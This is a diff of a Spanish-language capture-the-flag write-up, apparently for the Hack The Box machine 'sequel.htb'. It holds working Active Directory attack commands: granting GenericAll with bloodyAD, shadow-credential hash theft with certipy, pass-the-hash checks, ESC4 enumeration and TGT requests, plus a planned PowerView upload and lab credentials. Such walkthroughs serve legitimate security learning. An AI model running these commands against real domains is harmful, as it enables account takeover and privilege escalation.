@@ -300,6 +300,8 @@ Y después darle control total a `ryan`
 bloodyAD -d sequel.htb --host 10.129.232.128 -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan
 ```
 
+![[Pasted image 20260211211609.png]]
+
 Con la herramienta [[CERTIPY]] obtenemos el hash NT
 ```shell
 certipy shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc-ip 10.129.232.128
@@ -310,22 +312,9 @@ Con ese hash verificamos si es valido para el usuario `ca_svc`
 nxc smb 10.129.232.128 -u ca_svc -H 3b181b914e7a9d5508ea1e20bc2b7fce
 ```
 
-Podemos buscar a que vulnerabilidades esta expuesto con
+Ahora cambiaremos la contraseña este usuario
+Primerop subiremos un `PowerView` que es un modulo para enumerar Windows desde dentro `https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1`, con el comando
 ```shell
-certipy find -vulnerable -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.232.128 -stdout
-```
-
-Y vemos que es vulnerable a `ESC4` que esta relacionada con pertenecer al grupo `CERT PUBLISHER`
-![[Pasted image 20260211205006.png]]
-
-### ESC4 Abusing
-Obtenemos el TGT con [[IMPACKET]]
-```shell
-impacket-getTGT sequel.htb/ca_svc -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.232.128
-```
-
-Guardamos la salida en una variable de entrono
-```shell
-export KRB5CCNAME=ca_svc.ccache
+upload PowerView.ps1(https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 "PowerView.ps1")
 ```
 
